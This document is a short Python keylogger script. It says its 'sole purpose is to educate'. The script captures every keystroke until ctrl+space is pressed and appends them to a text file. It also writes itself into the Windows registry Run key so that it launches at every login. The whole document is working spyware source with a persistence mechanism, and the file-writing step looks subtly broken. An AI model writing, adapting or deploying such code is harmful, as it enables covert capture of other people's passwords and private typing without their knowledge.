#This is a script which can record the keystrokes and save it in a text file.
#This script's sole purpose is to educate.
#Coded by Medhaja H L


import keyboard
import datetime
import time
import sys
import os
import win32event, win32api, winerror
from winreg import *
import pickle



arr=[]
array=[]
temp='p'
ts = time.time()
st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
array.append(st)

while(keyboard.is_pressed('ctrl+space')==False):
	temp=str(keyboard.read_key()).strip("KeyboardEvent").replace("up","").replace("down","").strip("(").strip(")")
	arr.append(temp)

for x in range(len(arr)):
		if((x%2)==0):
			array.append(arr[x])
print(array)

with open("file.txt", 'ab') as file_handler:
    for item in array:
        file_handler.write("{}\t".format(item))


def addStartup():
		if getattr(sys, 'frozen', False):
			fp = os.path.dirname(os.path.realpath(sys.executable))
		elif __file__:
			fp = os.path.dirname(os.path.realpath(__file__))
		file_name=sys.argv[0].split("\\")[-1]
		new_file_path=fp+"\\"+file_name
		keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
		key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
		SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
addStartup()